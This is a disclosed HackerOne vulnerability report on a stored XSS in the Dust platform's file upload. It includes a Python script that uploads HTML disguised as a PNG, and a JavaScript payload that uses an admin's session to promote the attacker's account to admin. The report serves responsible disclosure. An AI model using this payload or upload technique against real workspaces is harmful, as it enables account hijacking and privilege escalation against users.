# Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover

## Report Details
- **Report ID**: 3115705
- **URL**: https://hackerone.com/reports/3115705
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-04-28T11:26:38.120Z
- **Disclosed**: 2025-05-02T12:01:14.166Z

## Reporter
- **Username**: sjalu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: dust

## Vulnerability Information
## Summary:
A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.

An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.

This allows an attacker to issue authenticated API requests on behalf of the victim, including:
	•	Promoting their own account to Admin
	•	Downgrading or removing legitimate admins
	•	Accessing and deleting secrets
	•	Full control over the workspace

The attack requires the victim to be a member of the same workspace and visit the malicious file URL. Once triggered, the attacker can fully compromise the workspace.

## Steps To Reproduce:

  1. Set up a workspace where you are admin.
 2. Invite a dummy account with the normal member role.
  3. Upload the malicious file on the dummy account using the Python script below. Use the HTML found at the bottom for upload.
```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

cookies = {
    'appSession': '<dummy_account_session>',
}

json_data = {
    'contentType': 'text/html',
    'fileName': 'xss_poc.png',
    'fileSize': 7331,
    'useCase': 'conversation'
}

response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
print(response.text)

uploadUrl = response.json()['file']['uploadUrl']

cookies = {
    'appSession': '<dummy_account_session>',
}

m = MultipartEncoder(
    fields={
        'file': (
            'xss_poc.png',  # Filename
            open('Dust/xss.html', 'rb'),  # File object
            'text/html'  # Content-Type
        )
    }
)

headers = {
    'accept': '*/*',
    'accept-language': 'nb-NO,nb;q=0.9,no;q=0.8,nn;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': m.content_type,  # This will correctly set boundary
    'origin': 'https://dust.tt',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dust.tt/w/<workspace_sid>/assistant/new',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

# Make the request
response = requests.post(
    url=uploadUrl,
    headers=headers,
    cookies=cookies,
    data=m  
)

print(f'[*] URL TO SHARE:\n{response.json()["file"]["downloadUrl"]}?action=view')
```
  4. Share the URL with the workspace admin account.
 5. When the victim visits the link, your script runs automatically, promoting the dummy account to Admin. 

HTML File:
```html
<html>
<head>
  <title>PoC - Dust Workspace Takeover</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f8f9fa;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Proof of Concept - Dust Workspace Admin Takeover</h1>
    <p>When this page is visited by an admin inside a workspace, he'll give the attacker's user ID admin privileges. The attacker can then manually de-rank the former admin to a regualar member.</p>
  </div>

<script>
// Your user ID here (dummy account's ID)
const attackerUserId = '<dummy_id>'; // <-- replace with dummy account ID!

fetch('https://dust.tt/api/user', {
    method: 'GET',
    headers: {
        'accept': '*/*',
        'x-commit-hash': '41c0391',
    },
    credentials: 'include'
})
.then(res => res.json())
.then(userData => {
    if (userData.user && userData.user.workspaces && userData.user.workspaces.length > 0) {
        const workspaceId = userData.user.workspaces[0].sId; // Get workspace ID
        const victimUserId = userData.user.id; // Victim's own ID

        // 1. Promote attacker to admin
        fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'accept': '*/*',
                'x-commit-hash': '41c0391',
            },
            credentials: 'include',
            body: JSON.stringify({
                role: "admin"
            })
        });

        alert(`PWNED\n\nVictim Username: ${userData.user.username}\nVictim Email: ${userData.user.email}`);
    }
});
</script>
</body>
</html>
```

## Impact

This vulnerability allows an attacker to execute arbitrary JavaScript in the browser of any user within the same workspace who visits a malicious link. Through this, the attacker can perform any actions on behalf of the victim user, leveraging their active session without needing to steal or view the session cookie itself. An attacker view  (only key, not value - value is hidden for everyone) and delete private secrets, access internal data, modify settings, and if the victim has administrative privileges, escalate their own account to an admin role and revoke admin rights from others. This results in a full compromise of the user account, potential privilege escalation, and takeover of the entire workspace. The overall security impact is critical.

## Attachments
No attachments
